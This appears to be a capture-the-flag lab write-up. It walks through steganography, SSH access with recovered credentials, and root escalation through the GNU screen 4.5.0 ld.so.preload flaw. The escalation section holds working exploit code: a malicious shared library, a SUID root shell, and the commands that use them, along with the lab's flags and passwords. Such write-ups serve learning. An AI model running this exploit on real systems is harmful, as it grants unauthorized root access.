- 	Go to port 80, download the apache broken img.
- 	Fix the header to jpg.
- 	Go to the hidden directory. Bruteforce the secret parameter
- 	Got y2RPJ4QaPF!B -> steghide extract -sf thm.jpg
- 	username wbxre -> rot13 -> JOKER
- 	download the chall img. Steghide extract again. Got *axA&GF8dP
- 	username: JOKER, pass: *axA&GF8dP
- 	ssh joker@10.10.176.228
- 	joker@ubuntu:~$ cat user.txt 
  	THM{d5781e53b130efe2f94f9b0354a5e4ea}
- 	This particular version of the screen software opens the logfile with full root privileges so it’s 	possible to write any file anywhere on the system. In a nutshell, the priv esc is:
	
	1. Compile /tmp/rootshell, a binary that simply spawns /bin/sh as user root
    2. Compile /tmp/libhax.so, a shared library that will be loaded by screen as root. It chmods my rootshell binary to make it run as root.
    3. Run screen and overwrite /etc/ld.so.preload to include the shared library /tmp/libhax.so
    4. Run screen gain, this will load the shared library and execute the code
    5. Now, the rootshell binary is SUID root and we can run it to get root access

	```
	$ cat << EOF > /tmp/libhax.c
	#include <stdio.h>
	#include <sys/types.h>
	#include <unistd.h>
	__attribute__ ((__constructor__))
	void dropshell(void){
	    chown("/tmp/rootshell", 0, 0);
	    chmod("/tmp/rootshell", 04755);
	    unlink("/etc/ld.so.preload");
	    printf("[+] done!\n");
	} 
	> EOF

	$ gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
	$ rm -f /tmp/libhax.c
	```

	```
	$ cat << EOF > /tmp/rootshell.c
	#include <stdio.h>
	int main(void){
	    setuid(0);
	    setgid(0);
	    seteuid(0);
	    setegid(0);
	    execvp("/bin/sh", NULL, NULL);
	}
	EOF
	$ gcc -o /tmp/rootshell /tmp/rootshell.c
	$ rm -f /tmp/rootshell.c
	```

	```
	$ cd /etc
	$ umask 000
	$ /bin/screen-4.5.0 -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
	$ //bin/screen-4.5.0 -ls
	' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
	[+] done!
	No Sockets found in /tmp/screens/S-joker.

	$ /tmp/rootshell
	# whoami
	root
	```

- 	cd /root/ && cat root.txt
  	THM{5ecd98aa66a6abb670184d7547c8124a}